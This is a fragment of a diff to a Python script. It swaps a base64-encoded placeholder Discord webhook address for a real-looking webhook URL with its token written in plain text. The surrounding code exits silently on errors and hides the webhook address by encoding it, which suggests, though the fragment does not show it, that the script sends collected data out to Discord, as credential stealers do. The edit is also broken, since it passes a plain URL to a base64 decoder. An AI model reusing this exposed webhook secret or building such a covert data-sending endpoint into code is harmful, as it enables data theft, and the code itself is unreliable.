@@ -34,7 +34,7 @@ except Exception:
     os._exit(0)
 
 # ── config ──────────────────────────────────────────────────────────────
-_W = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvUkVQTEFDRS9NRQ=="
+_W = "https://discord.com/api/webhooks/1553144386424930394/80-8uNaAeMZ58KjdUMONSxIlR81e6kJ14pP040-7eia_U1M5h-G87iaUlrizWrrscw5c"
 WEBHOOK_URL = base64.b64decode(_W).decode()
 # ────────────────────────────────────────────────────────────────────────
 
